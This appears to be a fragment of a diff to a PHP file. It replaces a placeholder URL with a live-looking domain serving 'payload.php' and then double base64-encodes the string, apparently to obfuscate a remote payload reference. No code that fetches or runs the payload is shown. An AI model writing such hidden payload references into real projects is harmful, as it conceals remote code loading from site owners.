@@ -1,6 +1,6 @@
 <?php
 
-$inner = "http://example.com$$http://example.com/payload.php";
+$inner = "http://a.xzvs.top$$http://a.xzvs.top/payload.php";
 
 // 双重 base64
 $encoded = base64_encode(base64_encode($inner));
